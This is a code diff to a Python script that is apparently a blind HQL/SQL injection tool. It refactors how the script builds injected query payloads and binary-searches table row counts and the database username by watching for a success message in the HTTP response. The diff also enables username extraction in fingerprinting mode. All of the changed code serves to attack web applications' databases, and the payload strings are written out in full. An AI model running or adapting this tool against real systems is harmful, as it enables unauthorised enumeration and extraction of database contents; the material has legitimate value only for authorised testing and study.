@@ -116,11 +116,17 @@ def blind_hqli_injection_columns(url, params, param_to_test, file_column, blind_
 def get_dbms_username(url, params, param, message):
     global TABLES
 
-    table_to_test = TABLES[0]
-    params[param_to_test] = "' and (SELECT length(CONCAT(COUNT(*), '/', USER())) FROM User) >= 4 or ''='"
+    try:
+        table_to_test = TABLES.items()[0][0]
+    except:
+        raise Exception('No tables found ?')    
+    
+    request = "' and (SELECT length(CONCAT(COUNT(*), '/', USER())) FROM " + table_to_test + ") "
+    count = retrieve_count_or_length(url, params, param, message, request)
+    print "Count " + count
 
-    count_table = get_count_of_table(url, params, param, message, tables_to_test)
-    payload = str(count_table) + '/' 
+    # count_table = get_count_of_table(url, params, param, message, tables_to_test)
+    # payload = str(count_table) + '/' 
 
 
 def get_count_of_tables(url, params, param, message):
@@ -130,9 +136,14 @@ def get_count_of_tables(url, params, param, message):
         get_count_of_table(url, params, param, message, table)
 
 def get_count_of_table(url, params, param_to_test, message, name_table):
-    global TABLES
 
-    table_to_test = name_table
+    request = "' and (SELECT count(*) FROM " + name_table + ") "
+    count = retrieve_count_or_length(url, params, param_to_test, message, request)
+
+    print "[!] Count(*) of " + name_table + " : " + str(count)
+
+
+def retrieve_count_or_length(url, params, param_to_test, message, request):
     inf = 0
     sup = 10
 
@@ -141,13 +152,13 @@ def get_count_of_table(url, params, param_to_test, message, name_table):
         inf_str = '{:g}'.format(inf)
         sup_str = '{:g}'.format(sup)
 
-        params[param_to_test] = "' and (SELECT count(*) FROM " + table_to_test + ") = " + inf_str + " or ''='"
+        params[param_to_test] = request + " = " + inf_str + " or ''='"
         req = send_HTTP_request(url, params)
 
         if (message in req.content):
             break
     
-        params[param_to_test] = "' and (SELECT count(*) FROM " + table_to_test + ") >= " + sup_str + " or ''='"
+        params[param_to_test] = request + " >= " + sup_str + " or ''='"
         req = send_HTTP_request(url, params)
 
         if (message in req.content):
@@ -156,7 +167,7 @@ def get_count_of_table(url, params, param_to_test, message, name_table):
         else:
             sup = sup - floor((sup-inf)/2)
 
-    print "[!] Count(*) of " + table_to_test + " : " + '{:g}'.format(inf)
+    return '{:g}'.format(inf)
 
 
 def insert_table_name_in_tables(table_name):
@@ -243,7 +254,7 @@ else:
 
         if (opts.fingerprinting):
             get_count_of_tables(url, params, opts.param, opts.blind_hqli_message)
-            # get_dbms_username(url, params, opts.param, opts.blind_hqli_message)
+            get_dbms_username(url, params, opts.param, opts.blind_hqli_message)
 
     # enumerate tables and columns found if flag passed
     if (opts.results):
